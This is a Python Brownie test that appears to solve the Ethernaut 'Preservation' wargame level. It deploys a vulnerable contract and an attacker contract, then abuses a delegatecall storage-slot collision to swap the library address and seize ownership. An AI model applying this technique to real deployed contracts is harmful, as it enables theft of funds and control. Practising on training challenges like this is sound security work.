from brownie import Preservation, LibraryContract, PreservationAttack, accounts
from scripts.helpful_scripts import get_account


def test_preservation():
    """
    Change the preservation.timeZone1Library to our attacker contract.
    Call our attacker contract and assing the new owner
    """
    account = get_account()
    # Verify the code on etherscan
    print(f"Using the account {account}")

    # Deploy our PreservationAttack
    preservationattack = PreservationAttack.deploy(
        {"from": accounts[1]},
        publish_source=False,
    )
    print(
        f"PreservationAttack deployed {preservationattack.address} with account {accounts[1]}"
    )

    # Deploy two LibraryContract instances
    timezone1 = LibraryContract.deploy(
        {"from": account},
        publish_source=False,
    )
    print(f"TimeZone1 deployed {timezone1.address}")
    timezone2 = LibraryContract.deploy(
        {"from": account},
        publish_source=False,
    )
    print(f"TimeZone2 deployed {timezone2.address}")

    # Deploy preservation
    preservation = Preservation.deploy(
        timezone1.address,
        timezone2.address,
        {"from": account},
        publish_source=False,
    )
    print(f"Contract Preservation deployed to {preservation.address}")

    # Call setFirsTime and change preservation.timeZone1Library()
    preservation.setFirstTime(int(preservationattack.address, 16), {"from": account})
    print(f"Preservation.timeZone1Library: {preservation.timeZone1Library()}")

    # Assert our attack contract is the new timeZone1Library address
    assert preservation.timeZone1Library() == preservationattack.address

    # Call the attacker contract and assing the new owner
    # assert the new owner
    assert preservation.owner() == account.address
    preservation = Preservation[-1]
    preservation.setFirstTime(123, {"from": account})
    assert preservation.owner() == account.address
